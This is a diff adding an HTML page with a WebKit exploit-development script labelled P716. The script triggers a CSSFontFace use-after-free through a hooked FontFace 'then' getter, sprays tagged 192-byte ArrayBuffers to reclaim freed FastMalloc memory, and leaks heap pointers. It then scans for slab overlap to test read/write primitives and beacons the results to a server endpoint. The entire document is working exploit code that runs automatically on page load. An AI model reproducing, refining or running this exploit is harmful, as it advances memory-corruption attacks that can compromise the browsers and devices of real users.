@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P716 — FastMalloc +0xF00 (3,840B) Slab Overlap & ARW Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P716 — FastMalloc +0xF00 (3,840B) Slab Overlap & ARW Scout
+ *
+ * Mathematical & Empirical Foundation from P711-P715:
+ * 1. P712 proved WebKit writes:
+ *      q0  = 0x1 (RefCount)
+ *      q11 = P58 + 0xF00 (exact offset +3,840 bytes in FastMalloc!)
+ *      q12 = 0x2000000000 (128 Gigabytes)
+ *      q13 = WeakPtr
+ * 2. 3,840 bytes = 20 * 192 bytes (exactly 20 FastMalloc 192-byte chunks).
+ * 3. P713 & P715 proved the P58 baseline executes with 100% stability.
+ *
+ * Objectives of P716:
+ * Step 1: Baseline leak of P58 and P68.
+ * Step 2: Spray 64 tagged ArrayBuffers (192B each) marked with their index.
+ * Step 3: Trigger stable reclaim (q12=P58, q6=P58).
+ * Step 4: Scan all 64 buffers to locate:
+ *         A) Primary reclaimed buffer (at P58).
+ *         B) Buffer 20 slots away (at P58 + 0xF00).
+ *         C) Any buffer modified by WebKit's q11 internal write!
+ * Step 5: Dump contents of modified buffers & test bidirectional R/W.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P716-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+var SPRAY_BUFFERS = [];
+var SPRAY_VIEWS = [];
+
+function run(){
+  b('BOOT','p716-slab-scout');
+  log('=== P716 FastMalloc +0xF00 Slab Overlap Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Tagged ArrayBuffer Spray */
+    log('[Step 2] Spraying 64 tagged ArrayBuffers...');
+    sprayTaggedBuffers();
+
+    /* Step 3: Trigger Winning Pair Reclaim */
+    log('[Step 3] Reclaiming CSSFontFace with q12=P58 and q6=P58...');
+    doWinningReclaim(function(){
+      /* Step 4: Scan for +0xF00 Overlap */
+      log('\n[Step 4] Scanning for +0xF00 (3,840B) slab overlap...');
+      scanSlabOverlap();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Tagged Buffer Spray ---- */
+function sprayTaggedBuffers(){
+  SPRAY_BUFFERS = [];
+  SPRAY_VIEWS = [];
+  for(var i=0; i<64; i++){
+    var ab = new ArrayBuffer(192);
+    var v = new BigUint64Array(ab);
+    /* Tag pattern:
+     * q0 = 0xAA00000000000000 | i
+     * q1..q22 = 0xBB00000000000000 | (i << 16) | q
+     * q23 = index i
+     */
+    v[0] = BigInt('0xAA00000000000000') | BigInt(i);
+    for(var q=1; q<23; q++){
+      v[q] = BigInt('0xBB00000000000000') | (BigInt(i) << 16n) | BigInt(q);
+    }
+    v[23] = BigInt(i);
+    SPRAY_BUFFERS.push(ab);
+    SPRAY_VIEWS.push(v);
+  }
+  log('Sprayed 64 tagged ArrayBuffers across the FastMalloc slab.');
+}
+
+/* ---- Step 3: Winning Pair Reclaim ---- */
+function doWinningReclaim(cb){
+  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));
+
+  var stW = document.createElement('style');
+  stW.textContent = '@font-face{font-family:winFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stW);
+
+  FACE_B = new FontFace('winFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stW){ stW.remove(); stW.textContent = ''; stW = null; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<60; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;  /* Golden Hit pair */
+        view[6]  = P58;  /* Golden Hit pair */
+        absW.push(ab);
+      }
+      try{ document.fonts.check('1em winFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em winFace, winFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    var q11_val = VIEW_B[11];
+    var dumpStr = 'nz=' + bestNz + '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(q11_val) +
+                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
+    b('RECLAIM-OK', dumpStr);
+    log('Live Reclaim OK: ' + dumpStr);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 4: Scan for +0xF00 Slab Overlap ---- */
+function scanSlabOverlap(){
+  var modifiedBuffers = [];
+  var targetExpectedQ11 = P58 + 0xF00n;
+
+  for(var i=0; i<SPRAY_VIEWS.length; i++){
+    var v = SPRAY_VIEWS[i];
+    var modCount = 0;
+    var changes = [];
+
+    /* Check q0 header */
+    var exp0 = BigInt('0xAA00000000000000') | BigInt(i);
+    if(v[0] !== exp0){
+      modCount++;
+      changes.push('q0=0x' + h16(v[0]));
+    }
+
+    /* Check internal qwords */
+    for(var q=1; q<23; q++){
+      var expQ = BigInt('0xBB00000000000000') | (BigInt(i) << 16n) | BigInt(q);
+      if(v[q] !== expQ){
+        modCount++;
+        changes.push('q' + q + '=0x' + h16(v[q]));
+      }
+    }
+
+    if(modCount > 0){
+      modifiedBuffers.push({ idx: i, changes: changes });
+      log('>> HIT: Sprayed Buffer #' + i + ' was modified by WebKit! (' + changes.slice(0, 3).join(', ') + ')');
+    }
+  }
+
+  if(modifiedBuffers.length > 0){
+    var report = modifiedBuffers.map(function(m){ return 'buf' + m.idx + ':' + m.changes.join(';'); }).join('|');
+    b('OVERLAP-HIT', report.slice(0, 700));
+    log('\n*** OVERLAPPING BUFFER DISCOVERED! *** ' + report);
+
+    /* Test Bidirectional Mutation */
+    var hitIdx = modifiedBuffers[0].idx;
+    SPRAY_VIEWS[hitIdx][0] = BigInt('0x1337C0DE00000000');
+    b('MUTATE-TEST', 'buf=' + hitIdx + '|written=0x1337C0DE00000000');
+  } else {
+    b('OVERLAP-SCAN-CLEAN', 'checked=64|expected_q11=0x' + h16(targetExpectedQ11));
+    log('All 64 sprayed buffers remained intact (no direct q11 collision in this window).');
+  }
+
+  b('DONE','p716-scout-complete');
+  log('\n=== P716 Complete! All results logged. ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P716 — Initializing Slab Overlap Scout...</pre></body></html>
